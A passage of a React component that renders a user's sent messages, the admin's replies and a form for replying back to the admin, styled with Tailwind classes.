                    <span className="text-[10px] uppercase tracking-[0.3em] text-slate-500">{msg.from} - {formatMessageTime(msg.time || msg.timestamp || msg.createdAt)}</span>
                    {msg.adminReply && <span className="text-green-400 text-xs font-semibold">✓ REPLIED</span>}
                  </div>
                  <p className="text-sm leading-7 text-slate-200"><strong>Your message:</strong> {msg.message || msg.content}</p>
                  
                  {msg.adminReply && (
                    <div className="mt-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/20 p-4">
                      <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-2">Admin Reply - {formatMessageTime(msg.adminReplyTime)}</p>
                      <p className="text-sm text-slate-100">{msg.adminReply}</p>
                      {selectedMessageId !== msg.id && (
                        <button
                          onClick={() => setSelectedMessageId(msg.id)}
                          className="mt-3 text-cyan-300 text-xs hover:underline"
                        >
                          Reply to Admin
                        </button>
                      )}
                      {selectedMessageId === msg.id && (
                        <div className="mt-3">
                          <textarea
                            value={replyText}
                            onChange={(e) => setReplyText(e.target.value)}
                            placeholder="Type your reply here"
                            className="w-full rounded-2xl border border-white/10 bg-slate-900/80 px-4 py-2 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                          />
                          <button
                            onClick={() => handleReplyToAdmin(msg.id)}
                            className="mt-2 rounded-2xl bg-cyan-500 px-4 py-2 text-sm font-semibold text-black hover:bg-cyan-400"
                          >
                            Send Reply
                          </button>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        </section>
      </div>
    </div>
  );
}